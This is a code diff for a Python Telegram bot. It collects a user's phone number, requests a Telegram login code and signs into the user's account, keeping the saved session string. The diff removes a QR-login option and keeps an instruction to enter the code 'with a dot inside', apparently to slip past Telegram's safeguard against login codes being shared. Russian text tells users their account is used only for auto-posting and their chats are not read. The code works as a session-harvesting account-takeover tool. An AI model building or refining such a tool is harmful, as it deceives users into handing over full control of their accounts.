@@ -745,7 +745,7 @@ async def how_to_connect(callback: CallbackQuery):
     await callback.answer()
     await callback.message.answer(MANUAL_INSTRUCTION, parse_mode="HTML", disable_web_page_preview=True)
 
-# ==================== АВТОРИЗАЦИЯ ====================
+# ==================== АВТОРИЗАЦИЯ (ТОЛЬКО SMS, QR УБРАЛ) ====================
 @dp.callback_query(F.data == "btn_group_auth")
 async def group_auth(callback: CallbackQuery, state: FSMContext):
     await callback.answer()
@@ -753,43 +753,16 @@ async def group_auth(callback: CallbackQuery, state: FSMContext):
         await callback.message.answer("✅ Аккаунт уже подключен!")
         return
     
-    # Кнопки выбора способа входа
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="📱 По SMS-коду", callback_data="auth_sms")],
-        [InlineKeyboardButton(text="📷 По QR-коду", callback_data="auth_qr")],
-        [InlineKeyboardButton(text="❌ Закрыть", callback_data="auth_cancel")]
-    ])
-    
-    await callback.message.answer(
-        "🔐 <b>Аккаунт используется ТОЛЬКО для авторассылки.</b>\n"
-        "Личная переписка не читается и не сохраняется.\n\n"
-        "Выберите способ входа:",
-        parse_mode="HTML",
-        reply_markup=keyboard
-    )
-
-@dp.callback_query(F.data == "auth_qr")
-async def auth_qr(callback: CallbackQuery):
-    await callback.answer("❌ QR-код временно недоступен. Используйте SMS-код.", show_alert=True)
-
-@dp.callback_query(F.data == "auth_cancel")
-async def auth_cancel(callback: CallbackQuery, state: FSMContext):
-    await callback.answer()
-    await state.clear()
-    await callback.message.delete()
-
-@dp.callback_query(F.data == "auth_sms")
-async def auth_sms(callback: CallbackQuery, state: FSMContext):
-    await callback.answer()
-    
-    # Клавиатура для номера
+    # ===== ТОЛЬКО SMS! QR УБРАЛ! =====
     keyboard = ReplyKeyboardMarkup(
         keyboard=[[KeyboardButton(text="📱 Отправить номер", request_contact=True)]],
         resize_keyboard=True,
         one_time_keyboard=True
     )
     
-    await callback.message.edit_text(
+    await callback.message.answer(
+        "🔐 <b>Аккаунт используется ТОЛЬКО для авторассылки.</b>\n"
+        "Личная переписка не читается и не сохраняется.\n\n"
         "📱 <b>Введите номер телефона</b>\n\n"
         "Отправьте номер в формате:\n"
         "<code>79123456789</code>\n\n"
@@ -817,23 +790,19 @@ async def process_phone(message: Message, state: FSMContext):
         
         logging.info(f"📱 Номер: {phone}")
         
-        # ===== СОЗДАЕМ КЛИЕНТ =====
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         await client.connect()
-        
-        # ===== ОТПРАВЛЯЕМ КОД =====
         await client.send_code_request(phone)
         
-        # ===== СОХРАНЯЕМ В СОСТОЯНИЕ =====
         await state.update_data(
             phone=phone,
             client=client
         )
         
-        # ===== КНОПКА "ПОСМОТРЕТЬ КОД" ССЫЛКА НА TELEGRAM =====
+        # ===== КНОПКА "ПОСМОТРЕТЬ КОД" =====
         view_code_kb = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="📩 Посмотреть код", url="https://t.me/telegram")],
-            [InlineKeyboardButton(text="🔄 Попробовать снова", callback_data="auth_sms")]
+            [InlineKeyboardButton(text="🔄 Попробовать снова", callback_data="btn_group_auth")]
         ])
         
         await message.answer(
@@ -843,8 +812,7 @@ async def process_phone(message: Message, state: FSMContext):
             f"1️⃣ Нажми «Посмотреть код»\n"
             f"2️⃣ Открой Telegram и посмотри код\n"
             f"3️⃣ <b>Введи код с точкой внутри</b>\n"
-            f"<i>Например: 56.785</i>\n\n"
-            f"Если код не приходит, нажми «Попробовать снова».",
+            f"<i>Например: 56.785</i>",
             parse_mode="HTML",
             reply_markup=view_code_kb
         )
@@ -860,15 +828,12 @@ async def process_phone(message: Message, state: FSMContext):
 
 @dp.message(StateFilter(AuthState.waiting_for_code), F.text)
 async def process_code(message: Message, state: FSMContext):
-    # ===== ПОЛУЧАЕМ КОД С ТОЧКОЙ =====
+    # ===== УБИРАЕМ ТОЧКИ =====
     code_raw = message.text.strip()
-    
-    # ===== УБИРАЕМ ТОЧКИ ИЗ КОДА =====
     code = code_raw.replace('.', '')
     
-    logging.info(f"Код введен: {code_raw} -> очищен: {code}")
+    logging.info(f"Код: {code_raw} -> {code}")
     
-    # ===== ПРОВЕРЯЕМ ЧТО ЭТО ЦИФРЫ =====
     if not code.isdigit():
         await message.answer(
             "❌ <b>Неверный формат!</b>\n\n"
@@ -890,7 +855,6 @@ async def process_code(message: Message, state: FSMContext):
     await message.answer("🔄 Проверка кода...")
     
     try:
-        # ===== ВХОД С КОДОМ (БЕЗ ТОЧЕК) =====
         await client.sign_in(phone=phone, code=code)
         
         final_session = client.session.save()
